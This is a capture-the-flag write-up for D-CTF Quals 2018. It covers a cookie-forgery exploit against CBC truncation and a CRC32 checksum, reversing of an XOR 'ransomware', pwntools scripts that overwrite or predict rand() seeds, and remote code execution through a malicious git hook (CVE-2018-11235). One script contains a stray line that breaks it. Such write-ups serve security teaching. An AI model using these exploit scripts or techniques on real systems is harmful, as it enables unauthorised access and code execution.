# D-CTF Quals 2018

**It's recommended to read our responsive [web version](https://balsn.github.io/ctf_writeup/20180922-dctfquals2018/) of this writeup.**


 - [D-CTF Quals 2018](#d-ctf-quals-2018)
   - [Web](#web)
     - [Get Admin](#get-admin)
   - [Reverse](#reverse)
     - [ransomware](#ransomware)
   - [Exploit](#exploit)
     - [Lucky?](#lucky)
     - [Even more lucky?](#even-more-lucky)
     - [Online Linter](#online-linter)



## Web

### Get Admin

In order to get admin, the objective is to make `$u['id']=1` in the encrpted cookies. The ability we have is that we can register arbitrary unique username and email. The server will always return the encrypted cookie for us.

```php
if(!empty($_COOKIE['user'])) {                                                                                                                     
    $u = decryptCookie($_COOKIE['user']);

    if($u['id'] > 0) { 
        $_SESSION['userid'] = $u['id'];
        header("Location: /admin.php");
        exit;
    } 
    die('Invalid cookie.');
} else if(isset($_POST['username'], $_POST['password'])) { 
    $auth = new AuthLib($db);
    $userid = (int) $auth->authenticate($_POST['username'], $_POST['password']);
    if ($userid) { 
        $q = $db->query('SELECT * FROM `users` where id='.$userid);
        $row = $q->fetch(\PDO::FETCH_ASSOC);

        $_SESSION['userid'] = $userid;
      
        setcookie('user',encryptCookie([
            'id' => $userid,
            'username' => $_POST['username'],
            'email' => $row['email'], 
        ]), time()+60*60*24*30);
        
        header("Location: /admin.php");
        exit;
    } 
} 
```

But how does the cookie get encrypted? It basically uses its homemade encoding - using `÷¡` as the separator and encrypting the array in AES-128-CBC. It will also check the CRC32 checksum.

```php
function compress($arr) {
    return implode('÷', array_map(function ($v, $k) { return $k.'¡'.$v; }, $arr, array_keys($arr) ));
}
 
function decompress($cookie) {
    if(preg_match('/[^\x00-\x7F]+\ *(?:[^\x00-\x7F]| )*/im',$cookie, $m) == 0) {
        echo('Decryption error (1).');
        return false;
    }


    $t = explode("÷", $cookie);

    $arr = [];
    foreach($t as $el) { 
        $el = explode("¡", $el); 
        $arr[$el[0]] = $el[1];
    } 

    if(!isset($arr['checksum'])) {
        echo('Decryption error (2).');
        return false;
    }

    $checksum = intval($arr['checksum']);
    unset($arr['checksum']);
    $cookie = compress($arr);
    if($checksum != crc32($cookie)) {
        echo('Decryption error (3).');
        return false;
    } 

    return $arr;
}
function encryptCookie($arr) {
    $cookie = compress($arr);
    $arr['checksum'] = crc32($cookie); 
    return encrypt(compress($arr), AES_KEY, AES_IV);
}

function decryptCookie($cypher) { 
    return decompress(decrypt($cypher, AES_KEY, AES_IV));
}

function encrypt($plaintext, $key, $iv) {
    $length     = strlen($plaintext);
    $ciphertext = openssl_encrypt($plaintext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($ciphertext) . sprintf('%06d', $length);
}

function decrypt($ciphertext, $key, $iv) {
    $length     = intval(substr($ciphertext, -6, 6));
    $ciphertext = substr($ciphertext, 0,-6);
    $output     = openssl_decrypt(base64_decode($ciphertext), 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
    if($output == FALSE) {
        echo('Decryption error (0).');
        die();
    }
    return substr($output, 0, $length);
}

```

Let's analysis this snippet of code:

1. The length of the plaintext is appended after the ciphertext. Thus we can easily truncate the length plaintext.
2. CRC32 is checksum algorithm. It's not hash. We can easily compute the checksum of a given input without knowing the AES key.
3. It's possible to include the token `÷¡` in username or email. We can leverage `explode(TOKEN)` to manipulate the array.
4. When decompressing, the array will simply overwrite the existing key value pair.
5. What we want is to make `id=0` in the array.

Can we forge ciphertext of `id¡1÷username¡abcde÷email¡abcde÷checksum¡12345678`? Yes, just with some manipulation on CBC. We first make the server ecnrypt the following:

- username: `T84be7a4dc9`
- password: don't care
- email: `afbaf19bb997÷id¡1÷checksum¡1594149360`

And we will acquire the ciphertext of the following payload:
```
id¡112÷username¡T84be7a4dc9÷email¡afbaf19bb997÷id¡1÷checksum¡1594149360÷checksum¡2503531596

b'id\xc2\xa1112\xc3\xb7usernam'
b'e\xc2\xa1T84be7a4dc9\xc3\xb7'
b'email\xc2\xa1afbaf19bb'
b'997\xc3\xb7id\xc2\xa11\xc3\xb7chec'
b'ksum\xc2\xa11594149360'
b'\xc3\xb7checksum\xc2\xa12503'
b'531596'
```

What if we truncate the last 2 blocks (32 bytes)?

```
id¡112÷username¡T84be7a4dc9÷email¡afbaf19bb997÷id¡1÷checksum¡1594149360

b'id\xc2\xa1112\xc3\xb7usernam'
b'e\xc2\xa1T84be7a4dc9\xc3\xb7'
b'email\xc2\xa1afbaf19bb'
b'997\xc3\xb7id\xc2\xa11\xc3\xb7chec'
b'ksum\xc2\xa11594149360'
```

The username and email is crafted to pad the block and the checksum can be pre-computed with ease. `id=1` is then successfully overwritten.

Here is the script. Note that because length of id and checksum is not fixed, sometimes we have to manually pad/unpad the bytes. 

```python
#!/usr/bin/env python3
import requests
import secrets
import zlib
from urllib.parse import unquote, quote
import base64
s = requests.session()

def fold16(c):
    return [c[i * 16:(i+1) * 16] for i in range(len(c)//16+1)]

def compress(_id, user, mail):
    def _compress(_id, user, mail, checksum=None):
        if checksum:
            return f'id¡{_id}÷username¡{user}÷email¡{mail}÷checksum¡{checksum}'
        return f'id¡{_id}÷username¡{user}÷email¡{mail}'
    checksum = zlib.crc32(_compress(_id, user, mail).encode())
    return _compress(_id, user, mail, checksum)

username = 'T'+secrets.token_hex(5)
password = 'socute<3'
mail = secrets.token_hex(6)
print(username, password)
fixed_checksum = compress(1, username, mail).split('¡')[-1]
print(fixed_checksum)
payload = mail + f'÷id¡1÷checksum¡{fixed_checksum}'
c = compress(112, username, payload).encode()
print(c.decode())
print(*fold16(c), sep='\n')
aasdw

# register
s.post('https://admin.dctfq18.def.camp/register.php', data={
    'username': username,
    'password': password,
    'confirm_password': password,
    'email': payload,
})
s.post('https://admin.dctfq18.def.camp/', data={'username': username, 'password': password})
cookie = s.cookies.get_dict()['user']
l = int(cookie[-6:])
print('plaintext len = ', int(cookie[-6:]))
cookie = cookie[:-6]
print(cookie)
dec = base64.b64decode(unquote(cookie))
print(*fold16(dec), sep='\n')
assert len(dec) == 16 * 7
crop = dec
new_cookie = quote(base64.b64encode(crop)) + str(64+16).zfill(6)
r = requests.get('https://admin.dctfq18.def.camp/', cookies=dict(user=new_cookie))
print(r.status_code)
print(r.text)
#DCTF{4EF853DFC818AFEC39497CD1B91625F9E6E19D34D8E43E56722026F26A95F13E}
```


## Reverse

### ransomware
this chal provides two file: `ransomware.pyc` and `youfool!.exe`.
First use `uncompyle6` to get `ransomware.py`, and change the symbols inside it, we got the following code.
```python
import string
from random import *
import itertools

def caesar_cipher(text, key):
    key = key * (len(text) / len(key) + 1)
    return ('').join((chr(ord(text_chr) ^ ord(key_chr)) for text_chr, key_chr in itertools.izip(text, key)))


f = open('./FlagDCTF.pdf', 'r')
buf = f.read()
f.close()
allchar = string.ascii_letters + string.punctuation + string.digits
password = ('').join((choice(allchar) for i in range(randint(60, 60))))
buf = caesar_cipher(buf, password)
f = open('./youfool!.exe', 'w')
buf = f.write(buf)
f.close()
```
we can see that flag is probably in a PDF form.
After some google searching, we found that PDF structure is quite variable, however most of the structure are of printable ascii and readable words, with help of [this website](https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF) and a PDF we generated for reference, we mainly work on the following structure.
1. PDF start with `%PDF-1.`
2. PDF end with `\n%%EOF\n`
3. structure of 
    ```
    n 0 obj
    ...
    endobj
    ```
    where `n` is an increasing integer
4. structure of
    ```
    stream
    ...
    endstream
    ```
With the 4 above structures, we finally recover the PDF step by step along with the key `:P-@uSL"Y1K$[X)fg[|".45Yq9i>eV)<0C:('q4nP[hGd/EeX+E7,2O"+:[2`

flag : `DCTF{d915b5e076215c3efb92e5844ac20d0620d19b15d427e207fae6a3b894f91333}`


## Exploit

### Lucky?
This chal provides us a program which first read your name and then ask you to guess 100 number generated by calling `rand()`. Since the user name is `strcpy` into a buffer, the seed fed into `srand` can be overwritten, thus the `rand()` become predictable.
I first use `lucky.c` generate 100 `rand()` output, then send it by `lucky.py`
```c
//lucky.c
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
int main(){
	srand(0x61616161);
	char buf[100];
	int fd = open("see", O_RDWR);
	int ret;
	for(int i = 0; i < 100; i++){
		ret = snprintf(buf, 99, "%d\n", rand());
		write(fd, buf, ret);
	}
	close(fd);
}
```
```python
# lucky.py
#!/usr/bin/python
from pwn import *

host = '167.99.143.206'
port = 65031  

r = remote(host, port)
f = open('see', 'r')
x = f.read().split('\n')[:-1]
r.recvuntil('?')
r.sendline('a'*704)
for i in range(100):
    r.recvuntil(']')
    r.sendline(str(x[i]))
    print (i)
r.interactive()
```
flag : `DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}`

### Even more lucky?
This time the seed fed into `srand()` is `time(NULL) / 10`. No need to be too lucky.
I first compile `lucky2.c` into a.out, then call it by `lucky2.py`
```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv){
	int seed = atoi(argv[1]);
	srand(seed);
	for(int i = 0; i < 100; i++){
		printf("%d\n", rand());
	}
}
```
```python
#!/usr/bin/python
from pwn import *
import time
import os
host = '167.99.143.206'
port = 65032
r = remote(host, port)
x = time.time()
r.recvuntil('?')
r.sendline('a')
os.system('./a.out ' + str(x // 10) + ' > see')
f = open('see', 'r')
x = f.read().split('\n')[:-1]
for i in range(100):
    r.recvuntil(']')
    r.sendline(str(x[i]))
    print (i)
r.interactive()
```

flag : `DCTF{2e7aaa899a8b212ea6ebda3112d24559f2d2c540a9a29b1b47477ae8e5f20ace}`

### Online Linter

(bookgin)

The web service will clone a repository from a user-privided url, and perform some PHP syntax check on `*.php` files.

After a few tries we quickly note that the command is not only `git clone URL`. It uses this argument `--recurse-submodules`. My intuition is can we leverage this to write some evil code in [git hooks](https://git-scm.com/docs/githooks)?

A quick Google we found [CVE-2018-11235](https://nvd.nist.gov/vuln/detail/CVE-2018-11235), which adds malicious script in post-checkout githook. The PoC of this CVE is [availble on GitHub](https://github.com/Rogdham/CVE-2018-11235).

Then, set up the git repo via:
```
git daemon --port=11992 --verbose --export-all --base-path=.git --reuseaddr --strict-paths .git/
```

Refer to [this blog](https://railsware.com/blog/2013/09/19/taming-the-git-daemon-to-quickly-share-git-repository/).

Just modify evil.sh and it's easy to RCE. The flag is in one of the php files in `/var/www/html/`. We just `cat /var/www/html/*` and get the flag:)

Flag: `DCTF{4a49b863ba931ac65b077a504b973d9ddab4f343b00651a0b4ff9b8d7575f41f}`
